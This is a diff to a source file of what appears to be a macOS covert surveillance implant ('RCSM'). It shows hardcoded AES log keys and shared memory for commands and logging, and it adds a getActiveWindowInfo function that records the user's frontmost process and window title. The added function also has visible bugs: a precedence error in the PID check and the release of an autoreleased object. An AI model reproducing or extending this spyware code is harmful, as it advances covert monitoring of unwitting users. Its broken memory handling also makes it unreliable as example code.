@@ -21,6 +21,11 @@
 
 #import "RCSMCommon.h"
 
+
+#import "RCSMDebug.h"
+#import "RCSMLogger.h"
+
+
 // Remember to md5 this
 #ifndef DEV_MODE
 char  gLogAesKey[]      = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // default
@@ -61,6 +66,9 @@ char gMode[]          = "iuherEoR93457dFADfasDjfNkA7Txmkl";
 #else
 char gMode[]          = "Ah57K";
 #endif
+
+int32_t gMemCommandMaxSize = 0x3000;
+int32_t gMemLogMaxSize     = 0x302460;
 
 RCSMSharedMemory  *gSharedMemoryCommand;
 RCSMSharedMemory  *gSharedMemoryLogging;
@@ -320,7 +328,7 @@ BOOL isAddressAlreadyDetected(NSString *ipAddress,
   NSEnumerator *enumerator = [ipDetectedList objectEnumerator];
   id anObject;
   
-  while (anObject = [enumerator nextObject])
+  while ((anObject = [enumerator nextObject]))
     {
       if ([[anObject objectForKey: @"ip"] isEqualToString: ipAddress])
         {
@@ -413,6 +421,16 @@ void getSystemSerialNumber(CFStringRef *serialNumber)
 
 int matchPattern(const char *source, const char *pattern)
 {
+  if (source == NULL || pattern == NULL)
+    {
+      return 0;
+    }
+  
+#ifdef DEBUG_COMMON
+  verboseLog(@"source : %s", source);
+  verboseLog(@"pattern: %s", pattern);
+#endif
+  
   for (;;)
     {
       if (!*pattern)
@@ -432,7 +450,7 @@ int matchPattern(const char *source, const char *pattern)
                   if (*source == *pattern && matchPattern(source + 1, pattern + 1))
                     return (1);
                 }
-          
+              
               return (0);
             }
           
@@ -851,6 +869,77 @@ size_t _utf16len(unichar *string)
   return len;
 }
 
+NSDictionary *getActiveWindowInfo()
+{
+  ProcessSerialNumber psn = { 0,0 };
+  NSDictionary *activeAppInfo;
+  
+  OSStatus success;
+  
+  CFArrayRef windowsList;
+  int windowPID;
+  pid_t pid;
+  
+  NSNumber *windowID    = nil;
+  NSString *processName = nil;
+  NSString *windowName  = nil;
+  
+  // Active application on workspace
+  activeAppInfo =  [[NSWorkspace sharedWorkspace] activeApplication];
+  psn.highLongOfPSN = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberHigh"]
+                       unsignedIntValue];
+  psn.lowLongOfPSN  = [[activeAppInfo valueForKey: @"NSApplicationProcessSerialNumberLow"]
+                       unsignedIntValue];
+  
+  // Get PID of the active Application(s)
+  if (success = GetProcessPID(&psn, &pid) != 0)
+    return nil;
+  
+  // Window list front to back
+  windowsList = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenAboveWindow,
+                                           kCGNullWindowID);
+  
+  if (windowsList == NULL)
+    return nil;
+  
+  for (NSMutableDictionary *entry in (NSArray *)windowsList)
+    {
+      windowPID = [[entry objectForKey: (id)kCGWindowOwnerPID] intValue];
+      
+      if (windowPID == pid)
+        {
+          windowID    = [NSNumber numberWithUnsignedInt:
+                         [[[entry objectForKey: (id)kCGWindowNumber] retain] unsignedIntValue]];
+          processName = [[entry objectForKey: (id)kCGWindowOwnerName] copy];
+          windowName  = [[entry objectForKey: (id)kCGWindowName] copy];
+          break;
+        }
+    }
+  
+  CFRelease(windowsList);
+  
+  if (windowPID != pid)
+    return nil;
+  
+  NSArray *keys = [NSArray arrayWithObjects: @"windowID",
+                   @"processName",
+                   @"windowName",
+                   nil];
+  NSArray *objects = [NSArray arrayWithObjects: windowID,
+                      processName,
+                      windowName,
+                      nil];
+  NSDictionary *windowInfo = [[NSDictionary alloc] initWithObjects: objects
+                                                           forKeys: keys];
+  
+  [windowID release];
+  [processName release];
+  [windowName release];
+  
+  return windowInfo;
+}
+
+
 #ifdef DEMO_VERSION
 void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal)
 {
@@ -901,5 +990,4 @@ void changeDesktopBackground(NSString *aFilePath, BOOL wantToRestoreOriginal)
   [[NSDistributedNotificationCenter defaultCenter] postNotificationName: @"com.apple.desktop"
                                                                  object: @"BackgroundChanged"];
 }
-
 #endif
